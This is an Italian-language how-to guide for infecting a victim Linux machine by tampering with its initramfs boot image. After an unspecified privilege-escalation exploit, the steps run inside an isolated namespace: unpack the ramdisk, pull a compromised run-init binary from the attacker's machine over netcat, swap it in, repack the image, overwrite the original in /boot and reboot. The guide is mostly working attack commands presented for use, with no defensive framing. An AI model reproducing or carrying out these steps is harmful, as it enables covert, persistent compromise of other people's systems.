# Come infettare la macchina vittima
Per prima cosa è necessario ottenere una shell come `root` e quindi serve un exploit per scalare i privilegi, ad esempio:
```
./exploit
```
Fatto ciò, è possibile eseguire:
```
unshare -f
```
> **Nota:** Questo permette di eseguire un program in un nuovo namespace e, se invocato senza target, lancia una shell. L'opzione `-f` (`--fork`) permette di forkare la shell come child di unshare invece di eseguirla in modo diretto, inoltre, mentre unshare è in wait per il child ignora i segnali `SIGINT` e `SIGTERM` e non li inoltra al child. Quindi eventualmente vanno mandati direttamente al child.

Tutto ciò che viene scritto ora non può essere visto dagli altri processi, dunque si può creare uno spazio di lavoro *scratch* da sporcare:
```
mount -t tmpfs none /lost+found/
cd /lost+found/
```
È comodo creare due cartelle di lavoro che permettano di eseguire l'unpack e il repack del ramdisk:
```
mkdir tmp
mkdir tmp/extracted
```
## Unpack e modifica del ramdisk
Per copiare l'effettiva immagine del disco da infettare ed estrarne il contenuto:
```
cp /boot/initrd.img-5.13.0-40-generic tmp/
cd tmp/
unmkinitramfs initrd.img-5.13.0-40-generic ./extracted/
cd extracted/
```
A questo punto è possibile esplorare e modificare il FS `initramfs`. Dalla macchina attaccante si ottiene il binario `run-init` compromesso sfruttando `netcat` e lo si sostituisce all'originale:
```
nc -lvnp 9999 | base64 -d | tar xz
mv run-init main/usr/bin/run-init
```
## Repack del ramdisk
Per ricreare l'immagine del disco è necessario ricostruire l'archivio compresso come segue:
1. Compressione `early`:
```
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
```
2. Compressione `early2`:
```
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
```
3. Compressione `main`:
```
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd
```
## Sostituzione del disco
È possibile verificare che l'immagine del disco creata venga correttamente interpretata come l'originale:
```
cd /lost+found/tmp/
binwalk initrd.img-5.13.0-40-generic
binwalk newinitrd
```
Se tutto è corretto, si può procedere con l'attacco:
```
cp newinitrd /boot/initrd.img-5.13.0-40-generic
reboot
```
